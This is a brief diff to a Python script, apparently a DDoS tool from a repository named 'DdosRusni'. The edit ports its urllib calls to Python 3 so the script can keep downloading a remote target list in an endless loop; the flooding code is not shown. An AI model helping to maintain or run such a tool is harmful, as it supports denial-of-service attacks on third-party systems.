@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket,time,threading,sys,random,os,subprocess,requests,urllib
+import socket,time,threading,sys,random,os,subprocess,requests,urllib.request
 from os import getcwd
 
 with open('test.txt', 'w') as f:
@@ -18,7 +18,7 @@ while 1 == 1:
  #   f = open(filename,'w')
  #   f.write(str(r.content)+'\n')
  #   f.close
-    testfile = urllib.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
+    testfile = urllib.request.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
     print(testfile)
     with open(filename,'r') as f:
         for row in f:
